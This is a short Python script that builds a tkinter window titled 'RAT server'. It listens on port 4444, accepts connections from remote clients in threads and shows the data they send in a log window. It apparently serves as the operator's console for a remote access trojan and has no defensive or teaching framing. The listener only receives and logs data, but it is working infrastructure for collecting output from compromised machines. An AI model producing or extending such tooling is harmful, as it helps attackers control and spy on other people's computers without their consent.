import tkinter as tk
import socket
import threading

clients = []

def handle_client(client_socket, addr):
    output = client_socket.recv(4096).decode()
    log_box.insert(tk.END, f"[{addr}] {output}\n")
    client_socket.close()

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    log_box.insert(tk.END, "Listening for clients on port 4444...\n")
    while True:
        client, addr = server.accept()
        log_box.insert(tk.END, f"Connection from {addr}\n")
        thread = threading.Thread(target=handle_client, args=(client, addr))
        thread.start()
        clients.append((client, addr))

def start_server_thread():
    t = threading.Thread(target=start_listener)
    t.daemon = True
    t.start()

root = tk.Tk()
root.title("RAT server")
root.geometry("600x400")

log_box = tk.Text(root, bg="black", fg="lime", font=("Courier", 10))
log_box.pack(fill=tk.BOTH, expand=True)

start_button = tk.Button(root, text="Start Server", command=start_server_thread)
start_button.pack()

root.mainloop()
